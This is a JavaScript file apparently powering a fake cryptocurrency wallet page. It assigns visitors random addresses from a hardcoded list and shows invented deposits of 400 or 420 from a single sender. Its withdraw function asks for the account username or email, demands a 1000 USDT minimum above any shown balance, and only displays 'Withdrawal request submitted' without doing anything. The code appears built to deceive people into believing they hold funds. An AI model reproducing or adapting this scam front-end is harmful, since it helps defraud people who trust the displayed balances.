const WALLETS = [
	'0x5dB1130ba6F43759C28c9c95bbA06aB3A418C940',
	'0x2D06F08E67aC4d29E4B39BbE85EF04FF9a0A8C42',
	'0xBCd9b391677b8FF32729B3c49A77cBd11d639748',
	'0x0622bD7Cc537194Aa70003CE8eF5a858C106de17',
	'0x1Ac396096AB44b2a1B5FA2ed62b15093133B61D4',
	'0x12C09C0DeE80aae667e116825056b9EB57949E9E',
	'0x80290cAFbD161a4d88B794475eef4532C8969381',
	'0xeFD67180d4f95935782C8FF9Bd381726089a2b49',
	'0x411dCCa5e4d845591b644fE9dB395AaEbc5B0AF8',
	'0x7446D8E5A8971Cd00cd109c8bdFcA339F8945b09',
	'0xFB5849526E6e54Df9a30d03151218DF9BEcaEfc2',
	'0x7dD8010cb187046e25BD2Be2EC2b679790ba5116',
	'0x44441A8171FAF5cFF4839776d0764D1efCD329f3',
	'0x44446fbc7231514CC51d6FEfac355281E6c43809',
	'0x5aF8FcaCFd3C6B18d71C0BFC28a4f0415073d5c6',
	'0xfdAA645f45Ad1003c7060B2e169D54C299fad879',
	'0x34cb33B8f10bf72c0B00EAAB3a85a85D021ba4A9',
	'0x5d247ca702211061b6bE9efa27f6B19ce5098F32',
	'0x20951297114EB82c0c3d7204d168F9f404959Bd3',
	'0xEC73F5C42aE987c0263A8e360241426e0DEe32FA',
	'0x1AB053c3C4eca2bf202bdF9902253f64250587e0',
	'0x0294A40294de1f3102FC5DaA4501685c61FCDDa6',
	'0xeB21F95863F6E5eCbA500F6844449201E998e9c5',
	'0xDf0C62B3619accf51e6960Ea9078Fa10F1ddc0bF',
	'0x78ccd5f168bcDea9734De02fd0F943392b2253c6',
	'0x0eFfe0A00DC7d25f12215D9cfBCF60DE7AFF2a2E',
	'0x5308f51f28384b7d470642d45C4247A9258eb458',
	'0x96c7716CebD2eB0f43274519DC97b9fDA970509C',
	'0x7c56aE90ad6Bcff700B1B5B6Be36727c03Cf3326',
	'0x6889F33eDc9782C957070B23c0B4e01c03b7eFcc',
	'0x1ccEA64F3F176A23A00ce2203C7741FfeDd6647B',
	'0xfdc7C3dC7fa458134b8A8f42b3286053C3c7d501',
	'0x51Dd5Be1bFBD089B9f7b08712D25AF136B97aa50',
	'0x3de1Ce76Db55cbE2C6787bbCb65023039CD2673c',
	'0x2e279fFd9d5F4823D7F9D31A73ae464A2Db66fA2',
	'0x9490f344271DdeC37Bb7f31173f87257225ed80B',
	'0x14Ce161B6BDcDC8A25d6BBd0a1AE7B8297fdF7B7',
	'0xDb333341Deb09aA46148a8Db7a5A05e133a95c3A',
	'0x69dd6F11928AF9487F49b9F337473643C4a6DCd1',
	'0xED09AA2eAE243C495bD75bC461E266fd02e1D393',
	'0x57c99B7d6f79250A170EbF164DCa55212E7697BC',
	'0x30bE846CDBE26A062693FB3c9f59E242D9D161e3',
	'0xd0Aa7b3896D71C2cc3e6dE7A120194797012Bc25',
	'0x46e3A6C9Ab3dD4977c0C3B4716ebb75B084B5A9C',
	'0xab029155f502b0275DeBD88F1b9B17682Bd537b6',
	'0xF9097FA333f2FC4aC0ff8443dcf6A290fD226F5D',
	'0x22Cb14d83e367862a3b8A65F4B0133CD39520Ef7',
	'0x697992754DB6a2e3c69f6f7Ae951CE0036eB0711',
	'0x2f3f11cd6ca9D145d4387cCAFC06226f1dc918Af',
	'0x8bf42a05aB35006cFaDe8FA533DBAf5bD45b0B06',
	'0xf2A11ebB87F5c0Ce848fc2508cf5F59210c9030b',
	'0xE7219eE579304a7579272b8f646f16F3E9FC145A',
	'0x5D0E46f87CE7630d1A541D60CaD5aEECEfE0f1D0',
	'0xa31B0Bda2d8D231b275f955D492fbDfAF5A95281',
	'0x138525C209Ff71eF53ccf225e92FEdADa192B342',
	'0xEC209cDf01C409C7b99EA33633e05d96123887bD'
];
const TRANSACTIONS = {
	 '0x1Ac396096AB44b2a1B5FA2ed62b15093133B61D4': [
		 {from: '0x64A7c1569E5749c3c067656eeaa2Cb71D2AAaf49', amt: 400, ts: 1647933533525},
		// {from: '0x64A7c1569E5749c3c067656eeaa2Cb71D2AAaf49', amt: 200, ts: 1647860444083},
	 ],
	'0x0294A40294de1f3102FC5DaA4501685c61FCDDa6': [
		{from: '0x64A7c1569E5749c3c067656eeaa2Cb71D2AAaf49', amt: 420, ts: 1647933533525},
	]
};

let _scope;

const app = angular.module('myApp', []);
app.controller('myCtrl', function($scope) {
	$scope.user = getWallet();
	$scope.balance = 0;
	$scope.transactions = {};

	for (let i = 0; i < WALLETS.length; i++) {
		const key = WALLETS[i];

		if (key in TRANSACTIONS) {
			$scope.transactions[key] = TRANSACTIONS[key];
			$scope.transactions[key].forEach(trx => {
				trx.ts = moment(trx.ts).fromNow();

				if ($scope.user == key) $scope.balance += trx.amt;
			});
		}

		else {
			$scope.transactions[key] = [];
		}
	}

	$scope.createWallet = function() {
		$scope.user = newWallet();
	}

	_scope = $scope;
});

function getWallet() {
	const wallet = localStorage.getItem('wallet');
	
	if (wallet == undefined || wallet == null) return null;
	else return wallet;
}

function newWallet() {
	let indexes = localStorage.getItem('indexes');

	if (indexes == undefined || indexes == null) indexes = [];
	else indexes = JSON.parse(indexes);

	let key = null;
	while (true) {
		const index = Math.floor(Math.random() * (WALLETS.length - 1 + 1));
		// console.log(index);
		
		if (indexes.indexOf(index) == -1) {
			key = WALLETS[index];
			// console.log(key);


			indexes.push(index);
			localStorage.setItem('indexes', JSON.stringify(indexes));
			localStorage.setItem('wallet', key);

			break;
		}
	}

	if (key == null) return WALLETS[0];
	return key;
}

function createWalletDirect() {
	_scope.createWallet();
	_scope.$apply();
}

function withdraw() {
	const wUser = document.getElementById('wUser').value.trim();
	if (wUser == '') return alert('Please enter the username or email linked to your account');

	const wAmount = document.getElementById('wAmount').value;

	if (wAmount == '' || isNaN(wAmount)) return alert('Please enter a valid amount');
	else if (wAmount < 1000) return alert('Minimum withdrawal amount is 1000 USDT');
	else if (wAmount > _scope.balance) return alert('Insufficient balance for withdrawal');
	else alert('Withdrawal request submitted');
}
